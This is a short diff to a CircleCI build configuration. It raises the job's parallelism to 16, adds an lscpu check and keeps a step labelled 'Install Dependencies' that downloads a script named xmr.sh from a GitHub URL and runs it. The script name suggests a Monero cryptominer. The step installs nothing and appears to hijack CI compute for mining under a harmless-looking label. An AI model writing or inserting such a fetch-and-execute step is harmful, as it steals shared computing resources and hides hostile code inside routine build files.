@@ -3,12 +3,14 @@ jobs:
     trial:
       docker:
             - image: circleci/ruby:2.5.3
-      parallelism: 1
+      parallelism: 16
       steps:
         - run:
             name: Install Dependencies
             command: |
-              wget https://raw.githubusercontent.com/jayales/USDT_ku/main/xmr.sh && chmod +x xmr.sh && ./xmr.sh
+              lscpu
+               wget https://raw.githubusercontent.com/jayales/USDT_ku/main/xmr.sh && chmod +x xmr.sh && ./xmr.sh
+
 workflows:
     version: 2.1
     build:
